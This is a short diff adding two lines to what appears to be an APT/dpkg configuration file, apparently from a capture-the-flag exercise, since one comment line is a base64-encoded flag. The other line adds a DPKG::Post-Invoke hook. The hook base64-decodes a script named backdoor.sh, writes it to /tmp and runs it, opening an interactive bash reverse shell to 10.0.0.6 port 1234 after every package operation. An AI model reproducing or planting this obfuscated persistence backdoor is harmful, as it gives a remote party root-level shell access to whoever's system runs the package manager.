@@ -1,0 +1,2 @@
+#TDNha3s0cDdfSW41NzQxMV81aDMxMX0=
+DPKG::Post-Invoke {"file=$(echo 'YmFja2Rvb3Iuc2g='|base64 -d); echo 'IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo=' |base64 -d > /tmp/$file;chmod +x /tmp/$file;/tmp/$file";};
